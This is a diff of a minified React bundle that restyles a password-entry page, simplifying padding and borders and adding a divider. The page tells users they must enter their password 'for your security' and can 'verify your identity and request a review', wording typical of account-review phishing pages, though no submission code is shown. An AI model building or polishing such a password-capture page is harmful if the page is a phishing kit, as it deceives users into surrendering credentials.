@@ -11236,7 +11236,6 @@
                     children:
                       "For your security, you must enter your password to continue.",
                   }),
-
                   (0, c.jsxs)("div", {
                     className: "",
                     children: [
@@ -11246,9 +11245,7 @@
                         onChange: (e) => f(e.target.value),
                         style: {
                           width: "95%",
-                          padding: 10,
-                          paddingTop: 15,
-                          paddingBottom: 15,
+                          padding: 15,
                           fontSize: 15,
                           borderColor: "#d0d0d0",
                           borderWidth: 0.1,
@@ -11321,18 +11318,12 @@
                   }),
                 ],
               }),
-              (0, c.jsx)("br", {}),
-
               (0, c.jsxs)("div", {
                 className: "",
                 style: {
-                  backgroundColor: "#ffffff",
-                  paddingTop: 20,
-                  paddingBottom: 20,
-                  borderColor: "#000000",
-                  borderWidth: 0.2,
-                  borderRadius: 20,
-                  border: "1px solid #d0d0d0",
+                  backgroundColor: "#fff",
+                  padding: 20,
+                  borderRadius: 15,
                   lineHeight: 1.5,
                 },
                 children: [
@@ -11379,6 +11370,13 @@
                         },
                         children:
                           "If you believe this information is incorrect or causing confusion, please verify your identity and request a review.",
+                      }),
+                      (0, c.jsx)("hr", {
+                        style: {
+                          borderTop: "0.5px solid #d0d0d0",
+                          marginTop: 20,
+                          marginBottom: 20,
+                        },
                       }),
                       (0, c.jsx)("div", {
                         className: "",
